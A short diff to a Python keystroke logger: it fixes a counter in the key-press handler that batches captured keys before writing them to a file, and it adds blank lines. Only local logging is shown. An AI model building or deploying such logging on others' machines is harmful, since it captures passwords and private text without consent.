@@ -8,7 +8,7 @@ keys = []
 def press(key):
     global keys, count
     keys.append(key)
-    count = 1
+    count += 1
     print(key)
     if count >= 10:
         count = 0
@@ -23,5 +23,6 @@ def save(keys):
                 file.write("\n")
             elif _key.find("key") == -1:
                 file.write(_key)
-                
+     
+           
 
